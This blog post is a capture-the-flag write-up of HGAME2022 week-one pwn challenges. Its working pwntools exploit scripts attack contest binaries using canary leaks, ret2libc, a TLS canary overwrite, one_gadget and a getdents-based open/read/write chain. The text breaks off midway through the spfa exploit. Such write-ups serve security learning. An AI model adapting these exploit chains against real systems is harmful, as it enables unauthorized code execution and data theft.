    <content type="html"><![CDATA[<p>闲着时就去打了下杭电的 HGAME2022，以为第一周的题目都会蛮简单的，没想到每道题都花了不少功夫，出题人甚至还只是大二学生，顿时感觉到参差了。</p><span id="more"></span><h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="test-your-gdb"><a href="#test-your-gdb" class="headerlink" title="test_your_gdb"></a>test_your_gdb</h3><p>先检查一下保护</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/142799/6/33729/24698/63c7a9bcF35bfad36/6fed4a2b8bff6c89.png" style="zoom:80%;" /><p>再看一下程序逻辑</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/101274/4/36756/155822/63c7a9feF099d1b28/cfdd54cc86c9145f.png" style="zoom:80%;" /><p>动调直接去看加密后的 s2，我们大概停在判断位置处，看一下 s2 即 <strong>rsi</strong> 的值</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/160500/8/33195/17712/63c7aa34F130596f6/e241e939f93143d9.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/137137/5/32624/66896/63c7aa4dF03e59ce9/efe2f0a3602f0da7.png" style="zoom:80%;" /><p>上图显示不全，因为一共要比较 16 个字节：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/55339/21/22199/50202/63c7aa63F62dce033/9aee5be3ca36bf1b.png" style="zoom:80%;" /><p>所以 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./a.out&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">50610</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">backdoor=<span class="number">0x401256</span></span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0xb0361e0e8294f147</span>)+p64(<span class="number">0x8c09e0c34ed8a6a9</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;enter your pass word\n&#x27;</span>)</span><br><span class="line">io.recv(<span class="number">24</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary===&gt;&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+p64(<span class="number">0</span>)+p64(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="enter-the-pwn-land"><a href="#enter-the-pwn-land" class="headerlink" title="enter_the_pwn_land"></a>enter_the_pwn_land</h3><p>先检查一下保护：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/75946/29/24063/23754/63c7aaa1Fdf2816d1/56fe50f63cfa50e0.png" style="zoom:80%;" /><p>看一下主要函数：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/98042/24/22695/37543/63c7aaa0F7e0149da/03e9383158ddc998.png" style="zoom: 80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/107429/9/24505/38663/63c7aaa0F8c72c750/90f78d20ec80e81e.png" style="zoom:80%;" /><p>可以看到不断创造线程进入一个带有栈溢出漏洞的函数，值得注意的是，v3 作为 read 的返回值和 i 作为 s 的参数决定了读入的位置，这两者在覆盖的时候均不应被改变（不断的测试发现 v3 不能变，i 按理说可以变成下一次想读入的位置）。</p><p>清楚这一点后，exp 就是普通的 ret2libc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">34686</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;./a&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401313</span></span><br><span class="line">call_puts=<span class="number">0x0401090</span></span><br><span class="line">vul=<span class="number">0x04011BA</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x2c</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(<span class="number">0x404028</span>)+p64(call_puts)</span><br><span class="line">payload += p64(vul)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">setbuf_addr=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;libc=======&gt;&quot;</span>+<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;setbuf&quot;</span>]))</span><br><span class="line">log.success(<span class="string">&quot;setbuf===&gt;&quot;</span>+<span class="built_in">hex</span>(setbuf_addr))</span><br><span class="line">libc_base=setbuf_addr-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base==&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#libc_base=read_addr-libc.sym[&quot;read&quot;]</span></span><br><span class="line"><span class="comment">#log.success(&quot;read_addr====&gt;&quot;+hex(libc.sym[&quot;read&quot;]))</span></span><br><span class="line"><span class="comment">#log.success(&quot;libc_base====&gt;&quot;+hex(libc_base))</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x2c</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>注：打远程的时候发现泄露 read 的函数地址计算基址时会有偏差，所以换了 setbuf 就成了。libc-2.31 也需要栈对齐。</p><h3 id="enter-the-evil-pwn-land"><a href="#enter-the-evil-pwn-land" class="headerlink" title="enter_the_evil_pwn_land"></a>enter_the_evil_pwn_land</h3><p>题目和上题稍有变化，保护方面多开启了个 canary</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/163026/7/33522/24750/63c7aaa0Fcb1ef617/3becf79a7f742530.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/107429/9/24505/38663/63c7aaa0F8c72c750/90f78d20ec80e81e.png" style="zoom:80%;" /><p>当时的第一个想法是利用 puts 泄露canary，不过回过神来发现 puts 过后就直接检测 canary 了，所以打消这个念头。</p><p>记忆中其他绕过 canary 的方法有<strong>劫持 _stack_chk_fail</strong>，还有一种就是<strong>同时修改 canary 和 TLS 结构体</strong>中预存的 canary。前者一般需要任意写，后者的话印象中没遇到过。不过似乎有一种 stack smash 泄露信息的巧妙方法，这就触发了我的脑洞，会不会，有没有一种可能，TLS 结构体就被布置在了<strong>栈</strong>上？况且这道题溢出的空间还不少。</p><p>于是我就 gdb 调试了一下，看了一下栈上的信息</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/167708/4/31793/115472/63c7ab82F05d5d258/d54bbde560c2ee86.png" style="zoom:67%;" /><p>然后就继续往下找，终于在很远处发现了可疑目标：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/57709/16/23077/110254/63c7ab96F17f3a3e3/d2ac97e9c74302f9.png" style="zoom:80%;" /><p>此时我同时将两处覆盖为<code>aaaaaaaa</code>，发现程序不再报 stack smash 错误，说明我们已经成功绕过了 canary，需要说明的是远程偏移和本地不一样，送过去的数据尽量大就行。</p><p>继续打 ret2libc 构造 system(‘/bin/sh’)打不通。</p><p>原因不详，猜测是栈结构被我们搞得七零八落的，于是就考虑打 one_gadget。（不知为何 ubuntu16.04 检测 libc-2.31.so 时会报错，18 的就不会）如下：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/132953/12/29754/44405/63c8b9f0F978fb6b5/e01668aae890faba.png" style="zoom:80%;" /><p>直接打打不通，选择尝试构造条件，因为程序里有 csu 的 gadget，所以将寄存器 r15 和 r12 置零轻而易举：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/69351/29/25073/45548/63c8b9eeFc7a7133f/c5c0d76ceec68220.png" style="zoom:80%;" /><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./a.out&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">35225</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401363</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404030</span>)+p64(<span class="number">0x4010A0</span>)+p64(<span class="number">0x4011DA</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">3000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">setbuf_addr=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=setbuf_addr-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe6c7e</span></span><br><span class="line">log.success(<span class="string">&#x27;system==&gt;&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">log.success(<span class="string">&#x27;binsh===&gt;&#x27;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x000000000040135c</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(one_gadget)</span><br><span class="line"><span class="comment">#payload=payload.ljust(3000,&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="oldfashion-orw"><a href="#oldfashion-orw" class="headerlink" title="oldfashion_orw"></a>oldfashion_orw</h3><p>查看一下保护，NX 开着，看来不是编写 shellcode 题型</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/143518/13/33139/24804/63c7ac29F05bbc606/cbde94e9b4214053.png" style="zoom:80%;" /><p>看一下主函数逻辑</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/161218/20/34466/65115/63c7ac22F5927c23f/96c8d82807f603c2.png" style="zoom:80%;" /><p>有个没检查下限导致的栈溢出。通过这段溢出，构造 orw 链即可。</p><p>但这题的 flag 并不叫 flag，我们看一下出题人给的部署文件：</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/95051/26/18295/43571/63c7ac21F5f93642c/fb3c8ecc59e11856.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/209215/25/29511/55822/63c7ac20Fe576e25c/e415b3e6429764d6.png" style="zoom:80%;" /><p>所以还应先泄露 flag 名称才行，一开始想的是 chroot 逃逸或者 opendir &amp; readdir 之类的手法？？？虽然我也不会就是了。搞了一天没搞出来就去问了出题人，师傅告诉我就是读目录，<strong>目录也是文件</strong>，忽然想到 “ linux 下一切皆文件” 的理论。</p><p>于是直接想着直接 open(“/“) 这样子看能不能直接把目录相关数据用 read 和 write 读出来，但失败了，似乎 read 读不了目录文件？于是就在 64 位系统调用表上找其他系统调用，最后花了半天找到了 ‘getdents’</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/170693/32/34205/36390/63c7ac20F4f658c9f/6968cf0db5dc8df7.png" style="zoom:80%;" /><p>注：该题的 gadget 里没有 syscall，需要我们改 [ prctl ] 为 [ prctl + offset ] syscall 这样子，最后 4bit 为 0XC。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/6785/4/26433/55787/63c7acfbF533f2b1c/bebae0932440af72.png" style="zoom:80%;" /><p>该题也有 csu，因此可以构造任意系统调用，exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">42614</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;libc-2.31.so&quot;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">main=<span class="number">0x401315</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r15, r12, r13, r14</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r13d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r15</span></span><br><span class="line">    payload = p64(<span class="number">0x40143A</span>) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(<span class="number">0x401420</span>)</span><br><span class="line">    payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x401315</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401443</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401441</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#prctl====&gt;syscall</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)+p64(elf.got[<span class="string">&quot;prctl&quot;</span>])+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4010A0</span>)+p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;done!\n&#x27;</span>,p8(<span class="number">0xc</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(0,bss,0x10) bss===&gt;&#x27;/&#x27;</span></span><br><span class="line">bss=<span class="number">0x404088</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">0</span>,bss,<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;done!\n&#x27;</span>,<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(&quot;/&quot;)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4010A0</span>)+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;prctl&quot;</span>],bss,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.send(<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fstat</span></span><br><span class="line"><span class="comment">#temp=0x404088</span></span><br><span class="line"><span class="comment">#io.sendafter(&#x27;size?\n&#x27;,str(-1))</span></span><br><span class="line"><span class="comment">#payload=&#x27;a&#x27;*0x38+p64(pop_rdi_ret)+p64(0)</span></span><br><span class="line"><span class="comment">#payload+=p64(pop_rsi_r15_ret)+p64(bss-0x10)+p64(0)</span></span><br><span class="line"><span class="comment">#payload+=p64(0x4010A0)+csu(0,1,elf.got[&quot;prctl&quot;],3,temp,0)</span></span><br><span class="line"><span class="comment">#payload+=csu(0,1,elf.got[&quot;write&quot;],1,temp,0x300)</span></span><br><span class="line"><span class="comment">#payload+=p64(main)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#io.sendafter(&quot;content?\n&quot;,payload)</span></span><br><span class="line"><span class="comment">#io.send(&#x27;aaaaa&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getdents(0,bss,0x300)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">0</span>,bss+<span class="number">0x10</span>,<span class="number">78</span>)</span><br><span class="line">payload+=csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;prctl&quot;</span>],<span class="number">3</span>,bss,<span class="number">0x300</span>)</span><br><span class="line">payload+=csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;write&quot;</span>],<span class="number">1</span>,bss,<span class="number">0x300</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">78</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get flag_name</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">bk=io.recv(<span class="number">20</span>)</span><br><span class="line">log.success(<span class="string">&#x27;flag&#x27;</span>+bk)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(0,bss,0x20) ---- bss=&gt;flag_name</span></span><br><span class="line">bss=<span class="number">0x404088</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">0</span>,bss,<span class="number">0x20</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;done!\n&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>+bk+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(flag_name)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4010A0</span>)+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;prctl&quot;</span>],bss,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line">io.send(<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(3,bss,0x80);write(1,bss,0x80)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;read&quot;</span>],<span class="number">4</span>,bss,<span class="number">0x80</span>)</span><br><span class="line">payload+=csu(<span class="number">0</span>,<span class="number">1</span>,elf.got[<span class="string">&quot;write&quot;</span>],<span class="number">1</span>,bss,<span class="number">0x80</span>)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">io.sendafter(<span class="string">&quot;content?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="spfa"><a href="#spfa" class="headerlink" title="spfa"></a>spfa</h3><p>wp 出来了，任意读漏洞当时是看到了的，就是不知道怎么用算法达到任意写的目的。还有一些细节需要注意，下面细说。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><ul><li><p>任意读</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/58250/28/23044/25765/63c7ad58F93fb1283/7bb957defcb03fdb.png" style="zoom:80%;" /></li><li><p>存在于<code>add</code>和<code>spfa</code>内的任意写</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/187146/37/31980/24100/63c7ad55F9bb13d32/bf2a17e2c9189750.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/75161/20/23579/45988/63c7ae06F5dcb0231/ae9e86f5eb192205.png" style="zoom:80%;" /></li><li><p>后门函数</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/146622/35/33316/3113/63c7ae06Fa04326d0/02f29734fe8eaceb.png" style="zoom:80%;" /></li></ul><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li>利用任意读泄露 got 表上的地址，获得 libc_base</li><li>利用任意读泄露 _fini_array 上的地址，获得 proc_base</li><li>利用任意读泄露 environ 内的环境变量栈地址，动调计算偏移得到 main 栈的返回地址</li><li>利用任意写将返回地址覆盖为后门函数</li></ul><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 